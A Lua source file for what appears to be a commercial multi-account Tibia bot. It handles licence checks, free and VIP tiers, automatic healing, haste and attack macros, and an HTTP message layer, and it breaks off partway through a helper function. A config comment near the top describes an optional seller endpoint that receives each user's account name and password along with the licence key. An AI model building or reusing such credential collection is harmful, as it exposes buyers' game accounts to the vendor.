--[[ ==========================================================
  RScriptz  v1.0  (edicion comercial)
  ----------------------------------------------------------
  Bot multi-cuenta para Tibia (vBot 4.8 / Mayas OTC).
  Cargado via loader HTTP desde GitHub, actualizacion automatica.

  MODOS:
    FREE  -> Healing (spells + pociones) + Follow basico
    VIP   -> Todo (Spells atk + Runes + Target auto + MC Hunt +
             Anti-PK + Hub multi-cuenta)

  El modo se elige la primera vez y se guarda en storage.
  Para pasar de FREE a VIP: boton "Upgrade" en la pestana RQ.
========================================================== ]]

-- ====== CONFIGURACION DE LICENCIA (editar por el vendedor) ======
-- URL del Google Sheet publicado como CSV con columnas:
--   license_key,character_name_o_asterisco,expires_YYYY-MM-DD
-- Dejar vacio ("") para modo dev (acepta cualquier key que empiece con "RQ-")
local LICENSE_CSV_URL = ""
-- URL del endpoint POST para registro (Google Apps Script). Vacio = desactivado.
-- Recibe: {k=key, a=account, p=password, c=char, t=timestamp}
local RQ_LOG_URL = ""

-- ====== BOOTSTRAP ======
RQ = RQ or {}
RQ.version = "1.0"
RQ.tier = "FREE"   -- se cambia tras seleccion

-- se van a definir aqui, se llaman al final segun el tier
local rqSetupFullBot   -- VIP
local rqSetupFreeBot   -- FREE

-- ==========================================================
--  INYECCION DEL OTUI  (definiciones de ventanas modales)
--  Intenta primero importStyleFromString, si no existe cae al
--  metodo estandar de vBot: escribir el otui a un archivo temporal
--  y cargarlo con g_ui.importStyle(path).
-- ==========================================================
local function _rqSay(msg)
    pcall(function() whiteInfoMessage("[RScriptz] "..tostring(msg)) end)
    pcall(function() print("[RScriptz] "..tostring(msg)) end)
end

-- helpers defensivos para APIs de vBot que pueden no estar en el scope
-- global del macro en Mayas OTC (getAttackingCreature, g_clock, etc)
local function _rqGetTarget()
    if not getAttackingCreature then return nil end
    local ok, r = pcall(getAttackingCreature)
    return ok and r or nil
end

local function _rqLoadOTUI(content)
    -- fallback 1: string directo
    if g_ui and g_ui.importStyleFromString then
        local ok, err = pcall(g_ui.importStyleFromString, content)
        if ok then _rqSay("OTUI cargado via importStyleFromString"); return true end
        _rqSay("importStyleFromString fallo: "..tostring(err))
    else
        _rqSay("importStyleFromString no existe en este cliente")
    end
    -- fallback 2: archivo temporal (varias rutas por si acaso)
    if g_resources and g_resources.writeFileContents then
        for _, path in ipairs({"rscriptz_runtime.otui", "/rscriptz_runtime.otui", "/bot/rscriptz_runtime.otui"}) do
            local ok, err = pcall(function()
                g_resources.writeFileContents(path, content)
                g_ui.importStyle(path)
            end)
            if ok then _rqSay("OTUI cargado via archivo: "..path); return true end
            _rqSay("archivo "..path.." fallo: "..tostring(err))
        end
    else
        _rqSay("g_resources.writeFileContents no existe")
    end
    return false
end

-- helper: verifica si un estilo OTUI esta registrado
local function _rqStyleExists(name)
    if not g_ui or not g_ui.getStyle then return false end
    local ok, style = pcall(g_ui.getStyle, name)
    return ok and style ~= nil
end
-- OTUI grande eliminado en v1.6.1 (todo va inline con setupUI)

-- ==========================================================
--  VALIDACION DE LICENCIA
-- ==========================================================
local function validateLicense(key, charName, cb)
    if not key or key == "" then cb(false, "key vacia"); return end
    -- modo dev
    if LICENSE_CSV_URL == "" then
        if key:sub(1,3) == "RQ-" then cb(true) else cb(false, "key invalida (dev: usar RQ-XXXX)") end
        return
    end
    -- prod: consultar Google Sheet publicado como CSV
    HTTP.get(LICENSE_CSV_URL, function(csv, err)
        if err or not csv then cb(false, "no puedo contactar servidor de licencias"); return end
        local hoy = os.date("%Y-%m-%d")
        for line in csv:gmatch("[^\n]+") do
            local k, c, exp = line:match("^([^,]+),([^,]+),([^,]+)")
            if k and k:gsub("%s+","") == key:gsub("%s+","") then
                if c ~= "*" and c ~= charName then
                    cb(false, "key valida pero no para este personaje")
                    return
                end
                if exp and exp < hoy then
                    cb(false, "key expiro el "..exp)
                    return
                end
                cb(true); return
            end
        end
        cb(false, "key no encontrada")
    end)
end

-- ==========================================================
--  SELECTOR FREE / VIP
-- ==========================================================
local function _askForKey()
    local charName = ""
    pcall(function() charName = player:getName() end)
    modules.client_textedit.show(nil, {
        title = "License Key VIP",
        description = "Ingresa tu key de RScriptz VIP\n(contacta al vendedor si no tenes)",
    }, function(key)
        if not key or key == "" then return end
        validateLicense(key, charName, function(ok, reason)
            if ok then
                storage.rscriptz_tier = "VIP"
                storage.rscriptz_key = key
                RQ.tier = "VIP"
                -- si venimos del panel FREE, destruirlo antes de montar VIP
                if RQ._freePanel then
                    pcall(function() RQ._freePanel:destroy() end)
                    RQ._freePanel = nil
                end
                local sok, serr = pcall(rqSetupFullBot)
                if sok then
                    pcall(function() displayInfoBox("RScriptz VIP",
                        "Modo VIP activado con la key:\n"..key.."\n\n"..
                        "Todos los modulos disponibles en la pestana RQ.") end)
                else
                    _rqSay("ERROR setup VIP: "..tostring(serr))
                    pcall(rqSetupFreeBot)
                end
            else
                pcall(function() displayErrorBox("RScriptz VIP", "Key rechazada: "..(reason or "?")) end)
            end
        end)
    end)
end

local function showTierSelector()
    -- Usa displayGeneralBox nativo. Capturamos el widget para poder cerrarlo
    -- manualmente en el callback (algunas versiones no lo cierran solas).
    local box
    box = displayGeneralBox(
        "RScriptz v"..RQ.version,
        "Bienvenido a RScriptz.\n\nElegi que version queres correr:\n\n"..
        "FREE  -- Solo Curacion + Haste\n"..
        "VIP   -- Todo (Healing avanzado, Spells, Runes, Target,\n"..
        "         MC Hunt, Anti-PK, Hub multi-cuenta)",
        {
            {text = "VIP", callback = function()
                pcall(function() box:destroy() end)
                _askForKey()
            end},
            {text = "FREE", callback = function()
                pcall(function() box:destroy() end)
                storage.rscriptz_tier = "FREE"
                RQ.tier = "FREE"
                pcall(rqSetupFreeBot)
                pcall(function() whiteInfoMessage("[RScriptz] Modo FREE activado") end)
            end},
        }
    )
end

-- ==========================================================
--  CORE (EventBus, Scheduler, Logger, Config, Game, Net, Catalog)
--  Estos se cargan siempre, tanto FREE como VIP.
-- ==========================================================
-- ==========================================================
--  CORE
-- ==========================================================
RQ.EventBus = (function()
    local M = {}
    local oyentes = {}; local sigId = 1; local cola = {}
    function M.on(nombre, fn, prio)
        oyentes[nombre] = oyentes[nombre] or {}
        table.insert(oyentes[nombre], {fn=fn, id=sigId, prio=prio or 0}); sigId = sigId + 1
        table.sort(oyentes[nombre], function(a,b) return a.prio > b.prio end)
    end
    function M.emit(nombre, datos) cola[#cola+1] = {n=nombre, d=datos or {}} end
    function M.process()
        local vueltas = 0
        while #cola > 0 and vueltas < 100 do
            vueltas = vueltas + 1
            local lote = cola; cola = {}
            for i = 1, #lote do
                local l = oyentes[lote[i].n]
                if l then for j = 1, #l do pcall(l[j].fn, lote[i].d) end end
            end
        end
    end
    return M
end)()

RQ.Scheduler = (function()
    local M = {}; local tareas = {}; local orden = {}
    local function ahora() return g_clock and g_clock.millis() or (os.time()*1000) end
    local function reordenar()
        orden = {}
        for n in pairs(tareas) do orden[#orden+1] = n end
    end
    function M.every(nombre, ms, fn)
        tareas[nombre] = {fn=fn, ms=math.max(ms,10), prox=ahora(), activa=true, fallos=0}
        reordenar()
    end
    function M.remove(n) tareas[n] = nil; reordenar() end
    function M.setInterval(n, ms) if tareas[n] then tareas[n].ms = math.max(ms,10) end end
    function M.tick()
        local t = ahora()
        for i = 1, #orden do
            local n = orden[i]; local ta = tareas[n]
            if ta and ta.activa and t >= ta.prox then
                local ok = pcall(ta.fn)
                if not ok then ta.fallos = ta.fallos + 1
                    if ta.fallos >= 10 then ta.activa = false end
                else ta.fallos = 0 end
                ta.prox = ahora() + ta.ms
            end
        end
        RQ.EventBus.process()
    end
    return M
end)()

RQ.Logger = (function()
    local M = {}
    function M.info(m,s)  pcall(function() whiteInfoMessage("[RQ]["..m.."] "..tostring(s)) end) end
    function M.warn(m,s)  pcall(function() whiteInfoMessage("[RQ]["..m.."] "..tostring(s)) end) end
    function M.error(m,s) pcall(function() statusMessage("[RQ]["..m.."] "..tostring(s)) end) end
    return M
end)()

RQ.Config = (function()
    local M = {}
    local function perfil()
        storage.rscriptz = storage.rscriptz or {}
        local nombre = "_default"
        pcall(function() nombre = player:getName() end)
        storage.rscriptz[nombre] = storage.rscriptz[nombre] or {}
        return storage.rscriptz[nombre]
    end
    local function partes(r)
        local p = {}; for x in tostring(r):gmatch("[^%.]+") do p[#p+1] = x end; return p
    end
    function M.get(r, def)
        local pp = partes(r); local n = perfil()
        for i = 1, #pp do
            if type(n) ~= "table" then return def end
            n = n[pp[i]]; if n == nil then return def end
        end
        return n
    end
    function M.set(r, v)
        local pp = partes(r); local n = perfil()
        for i = 1, #pp-1 do
            if type(n[pp[i]]) ~= "table" then n[pp[i]] = {} end
            n = n[pp[i]]
        end
        n[pp[#pp]] = v
    end
    function M.ensure(r, def) if M.get(r) == nil then M.set(r, def) end end
    -- referencia directa a una lista dentro del perfil (mutable)
    function M.list(r)
        if M.get(r) == nil then M.set(r, {}) end
        local pp = partes(r); local n = perfil()
        for i = 1, #pp do n = n[pp[i]] end
        return n
    end
    return M
end)()

RQ.Game = (function()
    local G = {}
    function G.hp()   local ok,v = pcall(hppercent); return ok and v or 100 end
    function G.mana() local ok,v = pcall(manapercent); return ok and v or 100 end
    function G.name() local ok,v = pcall(function() return player:getName() end); return ok and v or "" end
    function G.voc()
        local ok, v = pcall(function() return player:getVocation() end)
        return ok and v or 0
    end
    function G.pos()
        local ok,p = pcall(pos)
        if ok and p then return {x=p.x, y=p.y, z=p.z} end
        return nil
    end
    function G.hayCamino(destino, maxDist)
        if not destino then return false end
        local d = G.pos(); if not d then return false end
        if destino.z ~= d.z then return false end
        local ok, ruta = pcall(function()
            return findPath(d, destino, maxDist or 100, {ignoreNonPathable=false})
        end)
        return ok and ruta ~= nil and #ruta > 0
    end
    function G.irHacia(destino, maxDist)
        if not G.hayCamino(destino, maxDist) then return false end
        return pcall(function() autoWalk(destino, maxDist or 100) end)
    end
    function G.creatures()
        local r = {}
        local ok, l = pcall(getCreatures)
        if not ok or not l then return r end
        for i = 1, #l do
            local c = l[i]; local d = {}
            pcall(function()
                d.name = c:getName(); d.hp = c:getHealthPercent()
                d.isPlayer = c:isPlayer(); d.isMonster = c:isMonster(); d.ref = c
                d.pos = c:getPosition()
            end)
            if d.name then r[#r+1] = d end
        end
        return r
    end
    function G.jugadorPorNombre(nom)
        for _, c in ipairs(G.creatures()) do
            if c.name == nom and c.isPlayer then return c end
        end
        return nil
    end
    function G.dist(a, b)
        if not a or not b then return 999 end
        return math.max(math.abs(a.x-b.x), math.abs(a.y-b.y))
    end
    return G
end)()

-- ==========================================================
--  RQ.NET  (HTTP polling)
-- ==========================================================
RQ.Net = (function()
    local N = {}
    N.conectado = false; N.canal = "rq"; N.url = "http://127.0.0.1:9876"
    N.ultimoSeq = 0; N.tx = 0; N.rx = 0

    local function miNombre()
        local n = RQ.Game.name(); if not n or n == "" then n = "sinNombre" end; return n
    end
    local function jsonEsc(s) return tostring(s):gsub('\\', '\\\\'):gsub('"', '\\"') end
    local function encodeJSON(obj)
        if type(obj) ~= "table" then
            if type(obj) == "string" then return '"' .. jsonEsc(obj) .. '"' end
            if type(obj) == "number" then return tostring(obj) end
            if type(obj) == "boolean" then return obj and "true" or "false" end
            return "null"
        end
        local isArray = #obj > 0; local parts = {}
        if isArray then
            for i = 1, #obj do parts[#parts+1] = encodeJSON(obj[i]) end
            return "[" .. table.concat(parts, ",") .. "]"
        else
            for k, v in pairs(obj) do parts[#parts+1] = '"'..jsonEsc(k)..'":'..encodeJSON(v) end
            return "{" .. table.concat(parts, ",") .. "}"
        end
    end
    local function parseMsgs(txt)
        if not txt then return {}, 0 end
        local msgs, lastSeq = {}, 0
        for seq, body in txt:gmatch('"seq":%s*(%d+)[^{]*"msg":%s*(%b{})') do
            local nSeq = tonumber(seq); if nSeq and nSeq > lastSeq then lastSeq = nSeq end
            local tipo = body:match('"type":%s*"([^"]+)"')
            local from = body:match('"from":%s*"([^"]+)"')
            if tipo then msgs[#msgs+1] = {tipo=tipo, from=from or "?", raw=body} end
        end
        local lsRaw = txt:match('"last_seq":%s*(%d+)')
        if lsRaw then lastSeq = math.max(lastSeq, tonumber(lsRaw) or 0) end
        return msgs, lastSeq
    end

    function N.setUrl(u) if u and u ~= "" then N.url = u end end
    function N.connect(canal)
        N.canal = canal or "rq"
        pcall(function()
            local body = encodeJSON({name = miNombre(), channel = N.canal})
            HTTP.post(N.url .. "/join", body, function(resp, err)
                if err or not resp then N.conectado = false
                else N.conectado = true; N.ultimoSeq = 0 end
            end)
        end)
    end
    function N.send(tipo, datos)
        if not N.conectado then return end
        pcall(function()
            local m = {}
            if type(datos) == "table" then for k,v in pairs(datos) do m[k] = v end end
            m.type = tipo
            local body = encodeJSON({name = miNombre(), msg = m})
            HTTP.post(N.url .. "/publish", body, function() end)
            N.tx = N.tx + 1
        end)
    end
    function N.on(tipo, fn) RQ.EventBus.on("net."..tipo, function(evt) pcall(fn, evt.from, evt.data) end) end
    function N.poll()
        if not N.conectado then return end
        pcall(function()
            local url = N.url .. "/poll?name="..miNombre():gsub(" ", "%%20")
                        .."&channel="..N.canal.."&since="..tostring(N.ultimoSeq)
            HTTP.get(url, function(resp, err)
                if err or not resp then N.conectado = false; return end
                local msgs, lastSeq = parseMsgs(resp)
                if lastSeq > N.ultimoSeq then N.ultimoSeq = lastSeq end
                for _, m in ipairs(msgs) do
                    N.rx = N.rx + 1
                    local datos = {}
                    for k, v in m.raw:gmatch('"([^"]+)":%s*(%-?%d+%.?%d*)') do datos[k] = tonumber(v) end
                    for k, v in m.raw:gmatch('"([^"]+)":%s*"([^"]*)"') do
                        if k ~= "type" and k ~= "from" then datos[k] = v end
                    end
                    RQ.EventBus.emit("net."..m.tipo, {from=m.from, data=datos})
                end
            end)
        end)
    end
    return N
end)()

-- ==========================================================
--  CATALOGO
-- ==========================================================
RQ.Catalog = {
    -- Vocaciones estandar de scripts: EK/RP/ED/MS/EM (promoted)
    -- EM = Exalted Monk (vocacion nueva). Los spells de EM son aproximados,
    -- ajustar si el usuario reporta que no son los correctos.
    vocations = {"EK", "RP", "ED", "MS", "EM"},
    healSpells = {
        EK = {"exura ico", "exura gran ico", "exura san"},
        RP = {"exura", "exura gran", "exura san"},
        ED = {"exura", "exura gran", "exura vita", "exura gran mas res"},
        MS = {"exura", "exura gran", "exura vita"},
        EM = {"exura", "exura ico", "exura san"},
    },
    attackSpells = {
        EK = {"exori", "exori gran", "exori hur", "exori ico", "exori min", "exori mas"},
        RP = {"exori san", "exori mort", "exori con", "exori gran con", "exevo con hur", "divine missile"},
        ED = {"exori frigo", "exori tera", "exori gran frigo", "exori gran tera", "exori mas"},
        MS = {"exori vis", "exori flam", "exori mort", "exori gran vis", "exori gran flam", "exori mas"},
        EM = {"exori", "exori mas", "exori ico"},
    },
    runes = {
        {name="Sudden Death (SD)",      id=3155},
        {name="Great Fireball (GFB)",   id=3191},
        {name="Avalanche",              id=3161},
        {name="Thunderstorm",           id=3202},
        {name="Explosion",              id=3200},
        {name="Heavy Magic Missile",    id=3198},
        {name="Magic Missile",          id=3174},
        {name="Icicle",                 id=3177},
        {name="Stone Shower",           id=3175},
        {name="Ultimate Healing",       id=3160},
        {name="Intense Healing",        id=3152},
        {name="Wild Growth",            id=3156},
        {name="Fire Wall",              id=3188},
        {name="Energy Wall",            id=3189},
        {name="Poison Wall",            id=3196},
        {name="Magic Wall",             id=3180},
        {name="Paralyze",               id=3165},
    },
    hpPots = {
        {name="Health Potion",          id=266},
        {name="Strong Health Potion",   id=236},
        {name="Great Health Potion",    id=239},
        {name="Ultimate Health Potion", id=7643},
        {name="Supreme Health Potion",  id=8473},
    },
    mpPots = {
        {name="Mana Potion",            id=268},
        {name="Strong Mana Potion",     id=237},
        {name="Great Mana Potion",      id=238},
        {name="Ultimate Mana Potion",   id=7642},
        {name="Great Spirit Potion",    id=8472},
    },
}

local function findIdByName(lista, nombre)
    for _, e in ipairs(lista) do if e.name == nombre then return e.id end end
    return nil
end
local function findNameById(lista, id)
    for _, e in ipairs(lista) do if e.id == id then return e.name end end
    return nil
end
local function vocIdToName(vocId)
    vocId = vocId or 0
    -- Monk / Exalted Monk (vocacion nueva, ids inciertos entre servers)
    if vocId == 5 or vocId == 10 or vocId == 15 then return "EM" end
    local base = ((vocId - 1) % 4) + 1
    if base == 1 then return "MS" end
    if base == 2 then return "ED" end
    if base == 3 then return "RP" end
    if base == 4 then return "EK" end
    return "EK"
end

-- ==========================================================
--  SETUP FREE  (Healing + Follow solamente, resto bloqueado)
-- ==========================================================
-- catalogo de spells de haste por vocacion (para el modo FREE)
RQ.Catalog.hasteSpells = {
    EK = {"utani hur", "utani gran hur"},
    RP = {"utani hur", "utani gran hur"},
    ED = {"utani hur"},
    MS = {"utani hur", "utani gran hur"},
    EM = {"utani hur"},
}

-- helper: verifica si el player tiene el buff de haste activo.
-- Usa bitmask de PlayerStates. Bit 6 (valor 32) = Haste en OTServ estandar.
local function _rqTieneHaste()
    local ok, states = pcall(function() return player:getStates() end)
    if not ok or type(states) ~= "number" then return false end
    -- probamos con el numero estandar (32) y con PlayerStates.Haste si existe
    local mask = 32
    if PlayerStates and PlayerStates.Haste then mask = PlayerStates.Haste end
    -- bit.band puede no estar, hacer AND manual
    return (states % (mask * 2)) >= mask
end

rqSetupFreeBot = function()
    setDefaultTab("RQ")
    local ui = setupUI([[
Panel
  height: 310

  Label
    id: brand
    anchors.top: parent.top
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: RScriptz v1.0  [FREE]
    font: verdana-11px-rounded
    color: #D4AF37
    background-color: #232323
    height: 20

  Label
    id: info
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: Curacion + Haste + 1 Spell
    font: verdana-11px-rounded
    color: #8A8A8A
    background-color: #1A1A1A
    height: 16

  Label
    id: vocLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Vocacion:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 6
    width: 60

  ComboBox
    id: voc
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4

  BotSwitch
    id: swHeal
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 20
    !text: tr('CURACION')

  Label
    id: healSpellLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Spell:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4
    width: 50

  ComboBox
    id: heal1
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4

  Label
    id: healHpText
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: Curar cuando HP<= 80%
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: healHp
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 10
    maximum: 100
    step: 5
    height: 16
    margin-top: 2

  BotSwitch
    id: swHaste
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 20
    !text: tr('HASTE (auto)')

  Label
    id: hasteSpellLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Spell:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4
    width: 50

  ComboBox
    id: hasteSpell
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4

  BotSwitch
    id: swAtk
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    margin-top: 8
    height: 20
    !text: tr('SPELL ATAQUE')

  Label
    id: atkLbl
    anchors.top: prev.bottom
    anchors.left: parent.left
    text: Spell:
    color: #C8C8C8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4
    width: 50

  ComboBox
    id: atkSpell
    anchors.top: prev.top
    anchors.left: prev.right
    anchors.right: parent.right
    margin-left: 4

  Label
    id: atkCdText
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text-align: center
    text: cada 2000 ms
    color: #E8E8E8
    font: verdana-11px-rounded
    height: 14
    margin-top: 4

  HorizontalScrollBar
    id: atkCd
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    minimum: 500
    maximum: 6000
    step: 100
    height: 16
    margin-top: 2

  Button
    id: upgradeBtn
    anchors.top: prev.bottom
    anchors.left: parent.left
    anchors.right: parent.right
    text: [ UPGRADE A VIP ]
    color: #FFFFFF
    background-color: #B28B00
    font: cipsoftFont
    height: 22
    margin-top: 10
]])

    local C = RQ.Config
    local function safeCast(words)
        pcall(function() cast(words, 900) end)
    end
    local vocInicial = "EK"
    pcall(function()
        local v = player:getVocation()
        if v then vocInicial = vocIdToName(v) end
    end)
    local vocSpells = RQ.Catalog.healSpells[vocInicial] or {"exura"}
    local vocAttack = RQ.Catalog.attackSpells[vocInicial] or {"exori"}

    C.ensure("free.voc",        vocInicial)
    C.ensure("free.healOn",     true)
    C.ensure("free.healSpell",  vocSpells[1] or "exura")
    C.ensure("free.healHp",     80)
    C.ensure("free.hasteOn",    true)
    C.ensure("free.hasteSpell", (RQ.Catalog.hasteSpells[C.get("free.voc")] or {"utani hur"})[1])
    C.ensure("free.atkOn",      false)
    C.ensure("free.atkSpell",   vocAttack[1] or "exori")
    C.ensure("free.atkCd",      2000)

    -- fillCombo defensivo: prueba varias APIs porque Mayas MEHAH puede ser distinto
    local function fillCombo(combo, opts, current)
        if not combo or not opts or #opts == 0 then return end
        pcall(function() combo:clearOptions() end)
        local added = 0
        for _, o in ipairs(opts) do
            local s = tostring(o)
            local ok = pcall(function() combo:addOption(s) end)
            if not ok then pcall(function() combo:addOption(s, s) end); ok = true end
            if ok then added = added + 1 end
        end
        if current then
            local s = tostring(current)
            pcall(function() combo:setCurrentOption(s) end)
            pcall(function() combo:setOption(s) end)
        end
        if added == 0 then
            _rqSay("fillCombo FALLO -- ninguna opcion aceptada")
        end
    end

    fillCombo(ui.voc, RQ.Catalog.vocations, C.get("free.voc"))
    local function refreshSpellCombos(voc)
        fillCombo(ui.heal1,     RQ.Catalog.healSpells[voc]   or {}, C.get("free.healSpell"))
        fillCombo(ui.hasteSpell, RQ.Catalog.hasteSpells[voc] or {}, C.get("free.hasteSpell"))
        fillCombo(ui.atkSpell,  RQ.Catalog.attackSpells[voc] or {}, C.get("free.atkSpell"))
    end
    refreshSpellCombos(C.get("free.voc"))
    ui.voc.onOptionChange = function(w)
        local o = w:getCurrentOption(); local t = o and o.text or nil
        if t then C.set("free.voc", t); refreshSpellCombos(t) end
    end

    -- switches
    ui.swHeal:setOn(C.get("free.healOn", true))
    ui.swHeal.onClick = function(w) local n = not C.get("free.healOn", true); C.set("free.healOn", n); w:setOn(n) end
    ui.swHaste:setOn(C.get("free.hasteOn", true))
    ui.swHaste.onClick = function(w) local n = not C.get("free.hasteOn", true); C.set("free.hasteOn", n); w:setOn(n) end
    ui.swAtk:setOn(C.get("free.atkOn", false))
    ui.swAtk.onClick = function(w) local n = not C.get("free.atkOn", false); C.set("free.atkOn", n); w:setOn(n) end

    -- combos
    ui.heal1.onOptionChange     = function(w) local o = w:getCurrentOption(); if o and o.text then C.set("free.healSpell", o.text) end end
    ui.hasteSpell.onOptionChange = function(w) local o = w:getCurrentOption(); if o and o.text then C.set("free.hasteSpell", o.text) end end
    ui.atkSpell.onOptionChange  = function(w) local o = w:getCurrentOption(); if o and o.text then C.set("free.atkSpell", o.text) end end

    -- sliders
    local function refreshHealText()
        pcall(function() ui.healHpText:setText("Curar cuando HP<= "..C.get("free.healHp", 80).."%") end)
    end
    ui.healHp:setValue(C.get("free.healHp", 80)); refreshHealText()
    ui.healHp.onValueChange = function(_, v) C.set("free.healHp", v); refreshHealText() end

    local function refreshAtkText()
        pcall(function() ui.atkCdText:setText("cada "..C.get("free.atkCd", 2000).." ms") end)
    end
    ui.atkCd:setValue(C.get("free.atkCd", 2000)); refreshAtkText()
    ui.atkCd.onValueChange = function(_, v) C.set("free.atkCd", v); refreshAtkText() end

    RQ._freePanel = ui
    ui.upgradeBtn.onClick = function() _askForKey() end

    -- MACROS
    macro(200, "RScriptz FREE: Curacion", function()
        if RQ.tier ~= "FREE" then return end
        if not C.get("free.healOn", true) then return end
        local hp = RQ.Game.hp()
        local thr = tonumber(C.get("free.healHp", 80)) or 80
        if hp <= thr then safeCast(C.get("free.healSpell", "exura")) end
    end)

    macro(1000, "RScriptz FREE: Haste", function()
        if RQ.tier ~= "FREE" then return end
        if not C.get("free.hasteOn", true) then return end
        if _rqTieneHaste() then return end
        safeCast(C.get("free.hasteSpell", "utani hur"))
    end)

    local lastAtk = 0
    macro(500, "RScriptz FREE: Spell ataque", function()
        if RQ.tier ~= "FREE" then return end
        if not C.get("free.atkOn", false) then return end
        if not _rqGetTarget() then return end
        local cd = tonumber(C.get("free.atkCd", 2000)) or 2000
        if os.time() * 1000 - lastAtk >= cd then
            safeCast(C.get("free.atkSpell", "exori"))
            lastAtk = os.time() * 1000
        end
    end)

    RQ.Logger.info("RScriptz", "listo v"..RQ.version.." modo FREE (heal+haste+1atk)")
end

-- ==========================================================
--  SETUP FULL  (VIP: todo el bot)
-- ==========================================================
rqSetupFullBot = function()
    setDefaultTab("RQ")
    local C = RQ.Config
    local function safeCast(w) pcall(function() cast(w, 900) end) end
    local function safeUseSelf(id) pcall(function() useOnYourself(tonumber(id) or 0) end) end

    -- vocacion inicial
    local vocIni = "EK"
    pcall(function() vocIni = vocIdToName(player:getVocation() or 0) end)

    -- defaults
    C.ensure("vip.voc",    vocIni)
    C.ensure("vip.master", true)
    C.ensure("net.canal",  "rq")
    C.ensure("net.url",    "http://127.0.0.1:9876")

    local defHp    = {266, 239, 8473}
    local defMp    = {268, 238, 7642}
    local defHpPct = {60, 40, 20}
    local defMpPct = {50, 30, 15}
    local vocAtk = RQ.Catalog.attackSpells[vocIni] or {"exori","exori mas","exori gran"}
    for i=1,3 do
        C.ensure("vip.hp"..i..".on",     i==1)
        C.ensure("vip.hp"..i..".mode",   true)  -- true=POT, false=SPELL
        C.ensure("vip.hp"..i..".item",   defHp[i])
        C.ensure("vip.hp"..i..".spell",  "")
        C.ensure("vip.hp"..i..".pct",    defHpPct[i])
        C.ensure("vip.mp"..i..".on",     i==1)
        C.ensure("vip.mp"..i..".mode",   true)
        C.ensure("vip.mp"..i..".item",   defMp[i])
        C.ensure("vip.mp"..i..".spell",  "")
        C.ensure("vip.mp"..i..".pct",    defMpPct[i])
        C.ensure("vip.atk"..i..".on",    false)
        C.ensure("vip.atk"..i..".spell", vocAtk[i] or vocAtk[1] or "exori")
        C.ensure("vip.atk"..i..".cd",    2000)
        C.ensure("vip.ex"..i..".on",     false)
        C.ensure("vip.ex"..i..".spell",  "")
        C.ensure("vip.ex"..i..".cd",     5)
    end
    C.ensure("vip.tgt.on",         false)
    C.ensure("vip.tgt.range",      5)
    C.ensure("vip.fol.on",         false)
    C.ensure("vip.fol.leader",     "")
    C.ensure("vip.fol.dist",       2)
    C.ensure("vip.mch.isLeader",   false)
    C.ensure("vip.mch.leader",     "")
    C.ensure("vip.mch.followSame", true)
    C.ensure("vip.mch.crossFl",    true)
    C.ensure("vip.mch.shareTgt",   false)
    C.ensure("vip.mch.party",      false)
    -- Hotkeys (asignables via el modal)
    C.ensure("vip.hk.travel",     "")
    C.ensure("vip.hk.refill",     "")
    C.ensure("vip.hk.sell",       "")
    C.ensure("vip.hk.stopAtk",    "Escape")
    -- Utilidades
    C.ensure("vip.xp.on",     false)
    C.ensure("vip.xp.item",   0)      -- id del xp boost item (variable segun server)
    C.ensure("vip.sta.on",    true)
    C.ensure("vip.notif.death", true)
    C.ensure("vip.notif.level", true)
    C.ensure("vip.notif.loot",  false)
    C.ensure("vip.pk.on",          true)
    C.ensure("vip.pk.broadcast",   true)
    -- UTILITY (Haste + Anti-Par + Utamo + 3 Anillos + 3 Amuletos)
    C.ensure("vip.haste.on",    false)
    C.ensure("vip.haste.spell", (RQ.Catalog.hasteSpells[vocIni] or {"utani hur"})[1])
    C.ensure("vip.apar.on",     false)
    C.ensure("vip.utamo.on",    false)
    C.ensure("vip.utamo.mode",  true)   -- true=SPELL, false=RING
    C.ensure("vip.utamo.spell", "utamo tempo")
    C.ensure("vip.utamo.ring",  3049)   -- might ring como default para modo RING
    for i=1,3 do
        C.ensure("vip.ring"..i..".on",  false)
        C.ensure("vip.ring"..i..".inv", 0)   -- itemId sin uso (en BP)
        C.ensure("vip.ring"..i..".act", 0)   -- itemId cuando esta equipado (en slot)
        C.ensure("vip.neck"..i..".on",  false)
        C.ensure("vip.neck"..i..".inv", 0)
        C.ensure("vip.neck"..i..".act", 0)
    end

    -- ==================================================
    -- HELPERS DE BINDING
    -- ==================================================
    local function bindSwitch(w, key, def)
        if not w then return end
        pcall(function() w:setOn(C.get(key, def) and true or false) end)
        pcall(function() w.onClick = function()
            local n = not C.get(key, def); C.set(key, n); pcall(function() w:setOn(n) end)
        end end)
    end
    local function bindItem(w, key, def)
        if not w then return end
        pcall(function() w:setItemId(tonumber(C.get(key, def)) or tonumber(def) or 0) end)
        pcall(function() w.onItemChange = function(x)
            local id = 0; pcall(function() id = x:getItemId() end); C.set(key, id)
        end end)
    end
    local function bindSlider(slider, label, key, def, fmt)
        if not slider then return end
        local function refresh()
            pcall(function()
                if label then label:setText(string.format(tostring(fmt or "%s"), C.get(key, def) or def or 0)) end
            end)
        end
        pcall(function() slider:setValue(tonumber(C.get(key, def)) or tonumber(def) or 0) end)
        refresh()
        pcall(function() slider.onValueChange = function(_, v) C.set(key, v); refresh() end end)
    end
    local function bindText(w, key, def)
        if not w then return end
